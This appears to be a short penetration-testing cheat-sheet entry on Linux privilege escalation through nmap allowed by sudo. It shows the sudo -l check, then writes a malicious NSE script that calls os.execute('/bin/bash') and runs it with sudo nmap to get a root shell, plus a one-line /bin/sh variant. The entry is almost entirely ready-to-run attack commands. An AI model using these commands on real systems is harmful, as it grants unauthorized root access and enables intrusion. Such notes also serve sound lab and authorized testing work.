---
title: Sudo nmap NSE Privesc
category: privesc
subcategory: linux-privesc
os: linux
command: sudo nmap --script=/tmp/root.nse
tools: sudo, nmap
---


### When sudo allows nmap

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/nmap
```

### Drop a malicious NSE script

```bash
echo "os.execute('/bin/bash')" >> /var/tmp/offsec.nse
cat /var/tmp/offsec.nse
sudo /usr/bin/nmap --script=/var/tmp/offsec.nse
```

Alternative one-liner:

```bash
echo "os.execute('/bin/sh')" > /tmp/root.nse
sudo nmap --script=/tmp/root.nse
```
